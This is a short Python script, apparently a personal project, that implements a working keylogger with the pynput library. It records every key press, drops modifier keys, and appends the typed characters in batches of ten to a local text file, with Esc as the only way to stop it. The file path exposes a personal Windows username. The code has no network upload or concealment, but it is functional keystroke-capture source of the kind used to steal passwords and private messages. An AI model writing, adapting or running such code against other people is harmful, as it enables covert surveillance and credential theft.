import pynput
from pynput.keyboard import Key,Listener

count =0
keys = []

def on_press(key):
    global keys,count
    #print(key,"pressed")
    keys.append(key)
    count+=1

    if(count>=10):
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if(key == Key.esc):
        return False

def write_file(keys):
    with open(r"C:\Users\saiki\OneDrive\Coding files\My Python files\projects\Final\keylogger\keyLogs.txt","a+") as f:
        for key in keys:
            k = str(key).replace("'","")
            if(k.find("space")>0 or k.find("enter") > 0):
                f.write("\n")
            elif(k.find("Key") == -1):#if we find backspace ,ctl etc we will not store that
                f.write(k)

with Listener(on_press = on_press,on_release = on_release) as listenes:
    listenes.join()




